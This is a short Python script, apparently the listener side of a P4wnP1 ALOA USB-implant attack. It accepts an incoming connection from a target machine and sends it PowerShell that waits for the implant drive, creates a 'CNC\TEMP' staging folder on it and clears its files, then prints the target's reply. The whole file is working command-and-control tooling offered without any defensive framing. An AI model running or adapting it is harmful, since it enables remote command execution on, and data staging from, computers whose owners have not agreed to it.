import socket, sys, time

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)

    #Send command
    command = """$drivefound=$false
                    while (-not $drivefound)
                    {
                        try
                        {
                            $drive=Get-Volume -FileSystemLabel \"P4wnP1 ALOA\" -ErrorAction Stop
                        }
                        catch 
                        {
                            \"Waiting for P4wnP1 drive\"
                            sleep 1
                            continue
                        } 
                        $dl=($drive.DriveLetter | Out-String)[0] +\":\"
                        $drivefound=$true
                    }
                    
                    #batch files will create folder but log files of start-process are created first and need an existing path
                    New-Item -Path $dl"\\CNC\\TEMP" -ItemType Directory | Out-Null
		    Get-ChildItem -Path $dl"\\CNC\\TEMP" -Include * -File -Recurse | foreach { $_.Delete()}
                    echo \"Backup folder created \""""
    command += "\n"
    conn.sendall(command.encode())
	
    #Receive data from the target and get user input
    #while True:
    try:
        ans = conn.recv(1024).decode()
        #if not ans: break
        sys.stdout.write(ans)
    except:
        sys.stdout.write("An exception occurred") 
    s.close()
    # s.shutdown(1) # gives bad file descriptor error